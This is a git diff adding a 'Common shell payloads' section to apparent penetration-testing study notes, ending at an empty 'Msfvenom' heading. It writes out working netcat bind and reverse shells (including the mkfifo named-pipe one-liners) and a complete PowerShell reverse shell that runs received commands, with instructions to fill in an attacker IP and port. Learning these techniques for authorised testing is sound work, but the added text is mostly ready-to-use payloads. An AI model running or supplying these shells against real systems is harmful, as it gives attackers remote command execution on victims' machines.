@@ -92,3 +92,20 @@ The third easy way to stabilise a shell is quite simply to use an initial netcat
 With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
 
 Example: `stty rows <number>` & `stty cols <number>`
+
+## Common shell payloads
+### Executing a process
+In netcat there is a `-e` option which allows you to execute a process on connection. For example, as a listener: `nc -lvnp <PORT> -e /bin/bash` However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?).
+
+On Linux, we would instead use this code to create a listener for a bind shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`. This creates a [`named pipe`](https://www.linuxjournal.com/article/2156) at `/tmp/f` and then starts a netcat listener and connects the input of that listener to the output of the named pipe. Then the output gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.
+
+A very similar command can be used to send a netcat reverse shell: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`. This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.
+
+### Powershell
+When targeting a modern Windows Server, it is very common to require a Powershell reverse shell:
+
+`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+
+In order to use this, we need to replace `"<IP>"` and `"<port>"` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell.
+
+### Msfvenom
